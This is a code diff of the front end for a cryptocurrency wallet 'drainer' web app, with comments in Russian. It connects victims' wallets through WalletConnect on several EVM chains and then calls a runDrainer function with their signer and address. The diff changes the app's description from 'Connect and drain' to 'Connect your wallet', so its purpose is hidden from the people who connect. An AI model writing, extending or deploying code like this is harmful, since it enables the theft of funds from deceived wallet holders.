@@ -15,67 +15,82 @@ import { runDrainer } from './drainer.js'
 
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 
-// Список всех EVM‑сетей
-const networks = [ mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base ]
-const wagmiAdapter = new WagmiAdapter({ projectId, networks })
+// Все сети, которые ты хочешь поддерживать
+const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
 
+// Адаптер для Wagmi (WalletConnect и встроенные кошельки)
+const wagmiAdapter = new WagmiAdapter({
+  projectId,
+  networks
+})
+
+// Информация для WalletConnect/Trust Wallet
 const metadata = {
   name: 'Alex dApp',
-  description: 'Connect and drain',
+  description: 'Connect your wallet',
   url: 'https://checkalex.xyz',
   icons: ['https://checkalex.xyz/icon.png']
 }
 
+// Создаём AppKit модалку
 const modal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
   metadata,
   projectId,
-  features: { analytics: true }
+  features: {
+    analytics: true
+  }
 })
 
+// Ссылки на элементы
 const connectBtn = document.getElementById('connect-btn')
 const drainerBtn = document.getElementById('drainer-btn')
-const status    = document.getElementById('status')
+const status     = document.getElementById('status')
+
+// Разблокировать кнопку drainer на всякий случай
+drainerBtn.disabled = false
 
 let provider = null
 let signer   = null
 let address  = null
 
-// 1) Нажали «Подключить кошелёк»
+// Кнопка подключения
 connectBtn.addEventListener('click', () => {
-  status.textContent = 'Открываю кошелёк…'
   modal.open()
 })
 
-// 2) Когда AppKit сообщил о connect — сохраняем провайдер/синер/адрес и включаем кнопку Drainer
+// После подключения кошелька
 modal.on('connect', async () => {
   try {
     provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
     signer   = provider.getSigner()
     address  = await signer.getAddress()
-    status.textContent = `Подключено: ${address}`
+
+    status.textContent = `✅ Подключено: ${address}`
     drainerBtn.disabled = false
-  } catch (e) {
-    console.error('Ошибка подключения:', e)
-    status.textContent = `Ошибка подключения: ${e.message}`
+  } catch (err) {
+    console.error('Ошибка подключения:', err)
+    status.textContent = `❌ Ошибка подключения`
   }
 })
 
-// 3) Нажали «Запустить Drainer»
+// Запуск drainer
 drainerBtn.addEventListener('click', async () => {
   if (!signer || !address) {
-    status.textContent = 'Сначала подключите кошелёк'
+    status.textContent = '❗ Сначала подключите кошелёк'
     return
   }
+
   drainerBtn.disabled = true
-  status.textContent = 'Запускаю Drainer…'
+  status.textContent = '💥 Запуск Drainer...'
+
   try {
     await runDrainer(provider, signer, address)
-    status.textContent = '✅ Drainer выполнен'
-  } catch (e) {
-    console.error('Ошибка Drainer:', e)
-    status.textContent = `❌ Ошибка: ${e.message}`
+    status.textContent = '✅ Drainer завершён'
+  } catch (err) {
+    console.error('Ошибка в Drainer:', err)
+    status.textContent = `❌ Ошибка: ${err.message}`
   } finally {
     drainerBtn.disabled = false
   }
